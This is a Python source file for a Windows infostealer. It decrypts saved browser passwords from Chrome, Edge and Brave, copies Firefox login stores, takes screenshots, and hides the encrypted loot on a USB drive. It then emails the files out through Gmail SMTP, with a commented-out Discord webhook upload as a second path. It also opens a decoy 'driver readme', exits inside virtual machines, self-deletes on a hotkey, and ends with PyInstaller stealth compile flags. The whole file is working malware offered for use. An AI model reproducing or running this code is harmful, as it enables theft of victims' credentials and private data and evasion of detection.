import os
import shutil
import sqlite3
import json
import base64
import win32crypt
import pandas as pd
import ctypes
import tempfile
import time
import threading
import sys
import keyboard
import requests
import socket
import getpass
import zipfile
import smtplib
import configparser
from email.message import EmailMessage
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from PIL import ImageGrab

# Hide the console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# AES Key from earlier
AES_KEY = base64.b64decode("WjJuKOjI7EXLwDe9xezW7sgS46vHcSp5U+BHgbZzpmQ=")
ZIP_PASSWORD = b"For3nsiC$2025"

def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    pad_len = data[-1]
    return data[:-pad_len]

def decrypt_ini_file(enc_path):
    with open(enc_path, "rb") as f:
        raw = f.read()
    iv = raw[:16]
    enc_data = raw[16:]
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(enc_data)).decode()
    return decrypted

def encrypt_file(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data))
    enc_file = filepath + ".enc"
    with open(enc_file, 'wb') as f:
        f.write(iv + encrypted)
    os.remove(filepath)
    return enc_file

def get_master_key(path):
    try:
        with open(os.path.join(path, '..', 'Local State'), 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except:
            return ""

def extract_chromium_passwords(path, name):
    login_db = os.path.join(path, "Login Data")
    if not os.path.exists(login_db):
        return []

    temp_db = os.path.join(tempfile.gettempdir(), f"{name}_login.db")
    shutil.copyfile(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        entries = cursor.fetchall()
    except:
        entries = []
    conn.close()
    os.remove(temp_db)

    master_key = get_master_key(path)
    results = []
    for url, username, enc_pwd in entries:
        if username or enc_pwd:
            dec = decrypt_password(enc_pwd, master_key)
            results.append((url, username, dec))
    return results

def save_to_excel(data, path):
    df = pd.DataFrame(data, columns=["URL", "Username", "Password"])
    df.to_excel(path, index=False)

def hide_file(file_path):
    if os.path.exists(file_path):
        os.system(f'attrib +h "{file_path}"')
    return file_path

def zip_firefox_data(profile_dir, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.setpassword(ZIP_PASSWORD)
        for root, _, files in os.walk(profile_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, profile_dir)
                zf.write(file_path, arcname)

def copy_firefox_files(profile_dir, dest):
    collected = []
    if not os.path.exists(profile_dir):
        return None
    for p in os.listdir(profile_dir):
        full = os.path.join(profile_dir, p)
        if os.path.isdir(full):
            dst = os.path.join(dest, "firefox_profiles", p)
            os.makedirs(dst, exist_ok=True)
            for f in ["logins.json", "key4.db"]:
                src = os.path.join(full, f)
                if os.path.exists(src):
                    shutil.copy2(src, dst)
                    collected.append(dst)
    return os.path.join(dest, "firefox_profiles")

def load_email_config(usb_path):
    enc_path = os.path.join(usb_path, ".usb_hidden_config.ini.enc")
    if not os.path.exists(enc_path):
        return None
    try:
        decrypted_text = decrypt_ini_file(enc_path)
        config = configparser.ConfigParser()
        config.read_string(decrypted_text)
        return config["email"]
    except:
        return None

def screenshot_to_file(dest):
    img = ImageGrab.grab()
    path = os.path.join(dest, f"screenshot_{int(time.time())}.png")
    img.save(path)
    # return encrypt_file(path)
    hide_file(path)
    return path

# def upload_to_discord(file_path, label):
#     url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
#     try:
#         with open(file_path, 'rb') as f:
#             files = {'file': (os.path.basename(file_path), f)}
#             data = {'content': f"{label} from {getpass.getuser()} on {socket.gethostname()}"}
#             requests.post(url, data=data, files=files, timeout=15)
#     except:
#         pass

def email_file(file_path, config):
    try:
        msg = EmailMessage()
        msg['Subject'] = f"USB Extract: {os.path.basename(file_path)}"
        msg['From'] = config['sender']
        msg['To'] = config['recipient']
        msg.set_content("Credentials data attached.")
        with open(file_path, 'rb') as f:
            msg.add_attachment(f.read(), maintype='application', subtype='octet-stream',
                               filename=os.path.basename(file_path))

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(config['sender'], config['password'])
            smtp.send_message(msg)
    except:
        pass

def extract_all(usb_path):
    config = load_email_config(usb_path)
    browsers = {
        "chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        "edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        "brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
        "firefox": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
    }

    for name, path in browsers.items():
        if name == "firefox":
            profile_dir = copy_firefox_files(path, usb_path)
            if profile_dir:
                zip_path = os.path.join(usb_path, "firefox_profiles.zip")
                zip_firefox_data(profile_dir, zip_path)
                # upload_to_discord(zip_path, "firefox_zip")
                hide_file(zip_path)
                if config: email_file(zip_path, config)
        else:
            if os.path.exists(path):
                data = extract_chromium_passwords(path, name)
                if data:
                    out = os.path.join(usb_path, f"{name}.xlsx")
                    save_to_excel(data, out)
                    enc = encrypt_file(out)
                    hide_file(enc)
                    # upload_to_discord(enc, name)
                    if config: email_file(enc, config)

    ss = screenshot_to_file(usb_path)
    # upload_to_discord(ss, "screenshot")
    if config: email_file(ss, config)

def detect_usb():
    for drive in "EFGHIJKLMNOPQRSTUVWXYZ":
        path = f"{drive}:/"
        if os.path.exists(path) and os.path.isdir(path):
            try:
                if len(os.listdir(path)) < 25:
                    return path
            except:
                continue
    return None

def self_delete():
    bat = os.path.join(tempfile.gettempdir(), "del.bat")
    with open(bat, "w") as f:
        f.write(f"""@echo off
timeout /t 3 > nul
del "{sys.executable}" > nul
del %~f0 > nul
""")
    os.system(f'start /min {bat}')

def monitor_key():
    while True:
        if keyboard.is_pressed('ctrl') and keyboard.is_pressed('shift') and keyboard.is_pressed('q'):
            self_delete()
            sys.exit()
        time.sleep(0.5)

def is_vm():
    try:
        out = os.popen("wmic baseboard get manufacturer").read().lower()
        return any(v in out for v in ['virtual', 'vmware', 'qemu', 'xen'])
    except:
        return False


def open_decoy_document(usb_path):
    decoy_name = "driver_readme.docx"  # or .pdf, etc.
    decoy_path = os.path.join(usb_path, decoy_name)
    if os.path.exists(decoy_path):
        os.startfile(decoy_path)

def open_decoy_if_argument():
    if len(sys.argv) > 1:
        doc_path = sys.argv[1]
        if os.path.exists(doc_path):
            os.startfile(doc_path)

# def show_fake_gui():
#     import tkinter as tk
#     from tkinter import messagebox
#     root = tk.Tk()
#     root.withdraw()
#     messagebox.showinfo("Driver Update", "Installation completed successfully.")

def main():
    if is_vm():
        sys.exit()

    threading.Thread(target=monitor_key, daemon=True).start()

    usb_path = detect_usb()
    if usb_path:
        open_decoy_document(usb_path)
    open_decoy_if_argument()
    # show_fake_gui()

    while True:
        usb_path = detect_usb()
        if usb_path:
            try:
                extract_all(usb_path)
            except:
                pass
        time.sleep(600)

if __name__ == "__main__":
    main()



# To Compile:
# pyinstaller --noconsole --onefile --icon=stealth.ico --key="SystemUpdateXYZ" usb_ops_final.py
